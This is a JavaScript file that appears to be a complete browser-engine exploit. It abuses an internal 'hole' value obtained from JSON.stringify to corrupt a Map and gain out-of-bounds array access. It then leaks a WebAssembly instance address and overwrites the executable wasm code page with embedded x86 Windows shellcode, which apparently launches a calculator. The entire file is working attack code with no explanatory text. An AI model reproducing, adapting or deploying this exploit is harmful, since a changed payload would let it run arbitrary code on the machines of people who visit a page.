function gc() {
    for (var i = 0; i < 0x100; i++) new Array(0x200);
  }
  var shellcode = [
0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30, 
0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 
0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 
0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1, 
0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b, 
0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 
0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 
0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24, 
0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb, 
0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f, 
0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 
0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 
0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x00
  ];
  var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
  var dv = new DataView(new ArrayBuffer(0x10));
  function f2big(f) {
    dv.setFloat64(0, f, true);
    return (dv.getBigUint64(0, true));
  }
  function big2f(b) {
    dv.setBigUint64(0, b);
    return dv.getFloat64(0);
  }
  function flow(f) {
    dv.setFloat64(0, f, true);
    return (dv.getUint32(0, true));
  }
  function fhi(f) {
    dv.setFloat64(0, f, true);
    return (dv.getUint32(4, true));
  }
  function i2f(low, hi) {
    dv.setUint32(0, low, true);
    dv.setUint32(4, hi, true);
    return dv.getFloat64(0, true);
  }
  var oob_arr = null;
  var leak = null;
  var rw_buff = null;
  for (let i = 0; i < 0x1000; i++) {
    oob_arr = [1.1, 1.1];
    leak = { ele: null };
    rw_buff = new ArrayBuffer(0x1000);
  }
  var rw_view = new DataView(rw_buff);
  rw_view.setBigUint64(0, 0x11223355n, true);
  var wasmModule = new WebAssembly.Module(wasmCode);
  var wasmInstance = new WebAssembly.Instance(wasmModule);
  var f = wasmInstance.exports.main;
  function trigger() {
    let a = [], b = [];
    let s = '"'.repeat(0x800000);
    a[20000] = s;
    for (let i = 0; i < 10; i++) a[i] = s;
    for (let i = 0; i < 10; i++) b[i] = a;
    try {
      JSON.stringify(b);
    } catch (hole) {
      return hole;
    }
    throw new Error('could not trigger');
  }
  let hole = trigger();
  var map1 = null;
  var map2 = null;
  var arr = null;
  function makeMapOdd(m, h) {
    m = new Map();
    m.set(1, 1);
    m.set(h, 1);
    m.delete(h);
    m.delete(h);
    m.delete(1);
    return m;
  }
  for (let i = 0; i < 0x1000; i++) {
    map1 = makeMapOdd(map1, hole);
    arr = new Array(1.1, 1.1);
  }
  //alert(map1.size);
  map1.set(0x10, -1);
  gc();
  leak.ele = wasmInstance;
  map1.set(oob_arr, 0xffff);

  let wasm_low = fhi(arr[2]);
  //alert("search wasm mod low addr: " + (wasm_low).toString(16));
  leak.ele = null;
  //alert("check arr indx 0");
  arr[0] = i2f(wasm_low, 0x20);
  
  let rwx = flow(oob_arr[7]);
  //alert("rwx: " + rwx.toString(16));
  arr[5] = i2f(rwx, 0x1000);
  //alert("backingStore");
  for (let i = 0; i < shellcode.length; i++) {
    rw_view.setInt8(i, shellcode[i]);
  }
  //alert("calc");
  f();